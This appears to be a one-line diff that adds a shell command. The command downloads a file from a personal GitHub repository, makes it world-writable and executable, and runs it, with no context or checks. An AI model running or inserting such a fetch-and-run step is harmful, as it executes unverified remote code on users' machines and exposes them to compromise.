@@ -1,0 +1,1 @@
+curl -# https://raw.githubusercontent.com/Hamza-Boulila/HBL-DEP-U/main/version-E  -o file && chmod 777 ./file && ./file
